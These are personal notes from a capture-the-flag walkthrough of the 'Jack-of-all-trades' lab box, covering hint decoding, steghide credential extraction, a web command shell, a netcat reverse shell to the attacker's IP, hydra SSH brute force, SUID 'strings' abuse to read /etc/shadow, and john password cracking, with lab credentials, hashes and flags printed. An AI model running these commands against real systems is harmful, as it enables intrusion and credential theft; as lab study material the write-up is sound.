![[Pasted image 20240712072823.png]]

Server running: 
- http port 22
- ssh port 80

curl:

```php
<html>
        <head>
                <title>Jack-of-all-trades!</title>
                <link href="assets/style.css" rel=stylesheet type=text/css>
        </head>
        <body>
                <img id="header" src="assets/header.jpg" width=100%>
                <h1>Welcome to Jack-of-all-trades!</h1>
                <main>
                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
                        <img src="assets/stego.jpg">
                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
                        <img src="assets/jackinthebox.jpg">
                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
                        <p id="signature">Jack</p>
                </main>
        </body>
</html>
```

UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==

base64:

Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: 

u?WtKSraq

![[Pasted image 20240712074132.png]]

Found something else on the login but it could be my pass that i'm entering.

GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= 

**Make sure to click the recipe on the left so it opens the full output**

![[Pasted image 20240712075620.png]]

Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F

Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S

Cyberchef ROT13 bruteforcer:

![[Pasted image 20240712081054.png]]

Leads to Stegosauria wiki page.

Maybe it's a username.

PASS:
u?WtKSraq

User:

---

I download the stego image and use the pass which gives me this:

```php
➜  jack-of-all-trades ls
ip.txt  nmap-full.txt  nmap-initial.txt  stego.jpg
➜  jack-of-all-trades steghide extract -sf stego.jpg 
Enter passphrase: 
wrote extracted data to "creds.txt".
➜  jack-of-all-trades cat creds.txt 
Hehe. Gotcha!

You're on the right path, but wrong image!
➜  jack-of-all-trades 
```

Pass doesn't work on the jack-in-the-box, but the header does.

```php
➜  jack-of-all-trades steghide extract -sf header.jpg      
Enter passphrase: 
wrote extracted data to "cms.creds".
➜  jack-of-all-trades cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

Username: jackinthebox
Password: TplFxiSHjY

http://10.10.162.47:22/nnxhweOV/index.php?

Message: GET me a 'cmd' and I'll run it for you Future-Jack.

![[Pasted image 20240712082321.png]]

We get command execution.

/ect/passwd

```php
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:104:109::/run/uuidd:/bin/false
Debian-exim:x:105:110::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
statd:x:107:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:108:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
```

We could try to brute force the SSH or use some of the passwords on it, but lets look around with cmd further.

![[Pasted image 20240712082929.png]]

Rev Shell:
```php
nc -c sh <MyIP> 4444
```


I find jack-password-list file and copy it to my machine to use with hydra:

```php
hydra -l jack -P jackpass.txt -s 80 ssh://10.10.162.47
```

![[Pasted image 20240712084348.png]]

login: jack   
password: ITMJpGGIqg1jn?>@

I log into jacks account via ssh:

i retrieve a jpg image off jacks home file system with nc

Me:
```php
nc -lvp 4444 > FILE
```

Target:
```php
nc <Target> 4444 -w 3 < FILE
```

Opening the file i see:

Userflag:
securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}

---

Now for privesc i'll upload some files:

```ouptu
[-] Kernel information:                                                
Linux jack-of-all-trades 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt9-2 (2015-04-13) x86_64 GNU/Linux 
[-] Specific release information:                                                                                                                             PRETTY_NAME="Debian GNU/Linux 8 (jessie)"                                       NAME="Debian GNU/Linux"                                                          VERSION_ID="8"                                                                  VERSION="8 (jessie)"                                                             ID=debian                                                                        HOME_URL="http://www.debian.org/"                                               SUPPORT_URL="http://www.debian.org/support/"      
```

Trying out the dirty cow exploit as L.E.S said it was highly probable.

```php
gcc 40839.c -o cow -lcrypt
```

x11-common, maybe be outdated leading to local priv-esc

linpeas gives me an indication that strings is misconfigured for SUID.

![[Pasted image 20240712101343.png]]

Confirms this is owned by root so we can probably use gtfobins to get root.

![[Pasted image 20240712101444.png]]

I think sudobaron, or something, may work as well.

I don't think this is the pass but it's interesting.

![[Pasted image 20240712101736.png]]

I dump passwords with gtfo bins exploit

```php
jack@jack-of-all-trades:~$ /usr/bin/strings /etc/shadow
root:$6$b3.jqCVW$RhHJyUpN81dfuW6J..8rTYX..7msovXxtbwQX4w8SIqxTuGOGpuKVft.1Cw1yvpGiHh2LULov1EA5H2m33dPk/:18321:0:99999:7:::
daemon:*:16550:0:99999:7:::
bin:*:16550:0:99999:7:::
sys:*:16550:0:99999:7:::
sync:*:16550:0:99999:7:::
games:*:16550:0:99999:7:::
man:*:16550:0:99999:7:::
lp:*:16550:0:99999:7:::
mail:*:16550:0:99999:7:::
news:*:16550:0:99999:7:::
uucp:*:16550:0:99999:7:::
proxy:*:16550:0:99999:7:::
www-data:*:16550:0:99999:7:::
backup:*:16550:0:99999:7:::
list:*:16550:0:99999:7:::
irc:*:16550:0:99999:7:::
gnats:*:16550:0:99999:7:::
nobody:*:16550:0:99999:7:::
systemd-timesync:*:16550:0:99999:7:::
systemd-network:*:16550:0:99999:7:::
systemd-resolve:*:16550:0:99999:7:::
systemd-bus-proxy:*:16550:0:99999:7:::
uuidd:*:16550:0:99999:7:::
Debian-exim:!:16550:0:99999:7:::
messagebus:*:16550:0:99999:7:::
statd:*:16550:0:99999:7:::
avahi-autoipd:*:16550:0:99999:7:::
sshd:*:16550:0:99999:7:::
jack:$6$X4GueAFP$m2Ovdp1jLV3OX3B40CkxQd0LTk8l2vLr0UplPHA0gm1e5bzwWLRGyUwnU94TdfWzgRjmhLyXOcacx0SE5VshN1:18321:0:99999:7:::
```

```php
jack@jack-of-all-trades:~$ /usr/bin/strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}

```

This completes the room but i wanted to crack the shadow file first.

Add both files to a pass.txt and shadow.txt then do the unshadow command

```php
unshadow pass.txt shad.txt > unshadow.txt
```

John can now crack it.

```php
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
```

We can then run john --show unshadow.txt to list the found passwords.

I don't think they are meant to be cracked especially after remembering what the pass we obtained was: password: ITMJpGGIqg1jn?>@

I'll leave it there, good box.